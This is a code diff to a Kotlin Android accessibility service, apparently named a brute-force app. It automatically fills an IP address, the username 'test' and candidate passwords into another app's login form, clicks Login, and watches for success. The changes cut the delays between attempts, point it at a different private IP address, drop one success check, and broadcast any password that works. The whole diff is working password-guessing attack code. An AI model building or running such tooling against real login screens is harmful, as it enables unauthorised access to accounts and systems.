@@ -36,7 +36,7 @@ class AutoFillAccessibilityService : AccessibilityService() {
     """
 
     private val hardcodedCredentials = mapOf(
-        "ip_address" to "10.0.129.26:5000",
+        "ip_address" to "192.168.1.50:5000",
         "username" to "test"
     )
 
@@ -74,17 +74,17 @@ class AutoFillAccessibilityService : AccessibilityService() {
             }
 
             // Method 2: Check for result text (fallback for old behavior)
-            val resultText = findLoginResultText(rootNode)
-            resultText?.let { text ->
-                Log.d(TAG, "Found result text: $text")
-
-                if (text.contains("Success", ignoreCase = true) ||
-                    text.contains("Login successful", ignoreCase = true)) {
-                    Log.d(TAG, "SUCCESS DETECTED! Login result shows success.")
-                    isLoginSuccessful = true
-                    shouldStopBruteForce = true
-                }
-            }
+//            val resultText = findLoginResultText(rootNode)
+//            resultText?.let { text ->
+//                Log.d(TAG, "Found result text: $text")
+//
+//                if (text.contains("Success", ignoreCase = true) ||
+//                    text.contains("Login successful", ignoreCase = true)) {
+//                    Log.d(TAG, "SUCCESS DETECTED! Login result shows success.")
+//                    isLoginSuccessful = true
+//                    shouldStopBruteForce = true
+//                }
+//            }
 
             // Method 3: Check if we're no longer on the login screen
             val loginButton = findNodeByText(rootNode, listOf("Login"))
@@ -210,7 +210,6 @@ class AutoFillAccessibilityService : AccessibilityService() {
         // Look for result text (usually colored text showing success/error)
         if (!text.isNullOrEmpty() &&
             (text.contains("Success", ignoreCase = true) ||
-                    text.contains("Login", ignoreCase = true) ||
                     text.contains("Error", ignoreCase = true) ||
                     text.contains("failed", ignoreCase = true))) {
             return text
@@ -258,10 +257,16 @@ class AutoFillAccessibilityService : AccessibilityService() {
                     fillLoginForm(ipAddress, username, password)
 
                     // Wait and check for success before continuing
-                    delay(3000) // Increased wait time for screen transition
+                    delay(1500) // Increased wait time for screen transition
 
                     if (shouldStopBruteForce) {
                         Log.d(TAG, "🎉 BREAKTHROUGH! Password '$password' cracked the system!")
+
+                        // Broadcast the breakthrough
+                        val intent = Intent("com.example.bruteforceapp.BREAKTHROUGH")
+                        intent.putExtra("password", password)
+                        sendBroadcast(intent)
+
                         return@launch
                     }
 
@@ -347,20 +352,20 @@ class AutoFillAccessibilityService : AccessibilityService() {
                 // Assume order: IP, Username, Password
                 Log.d(TAG, "Filling fields by order")
                 fillTextField(allEditableNodes[0], ipAddress)
-                Thread.sleep(500)
+                Thread.sleep(300)
                 fillTextField(allEditableNodes[1], username)
-                Thread.sleep(500)
+                Thread.sleep(300)
                 fillTextField(allEditableNodes[2], password)
-                Thread.sleep(500)
+                Thread.sleep(300)
             } else {
                 // Fallback to text-based search
                 val ipField = findNodeByText(rootNode, listOf("IP Address", "ip", "server"))
                 val userField = findNodeByText(rootNode, listOf("Username", "user", "email"))
                 val passField = findNodeByText(rootNode, listOf("Password", "pass"))
 
-                ipField?.let { fillTextField(it, ipAddress); Thread.sleep(500) }
-                userField?.let { fillTextField(it, username); Thread.sleep(500) }
-                passField?.let { fillTextField(it, password); Thread.sleep(500) }
+                ipField?.let { fillTextField(it, ipAddress); Thread.sleep(300) }
+                userField?.let { fillTextField(it, username); Thread.sleep(300) }
+                passField?.let { fillTextField(it, password); Thread.sleep(300) }
             }
 
             // Find and click login button
@@ -371,7 +376,7 @@ class AutoFillAccessibilityService : AccessibilityService() {
 
             loginButton?.let {
                 Log.d(TAG, "Clicking login button")
-                Thread.sleep(1000) // Extra delay before clicking
+                Thread.sleep(200) // Extra delay before clicking
                 it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
 
                 // Dismiss keyboard after clicking login
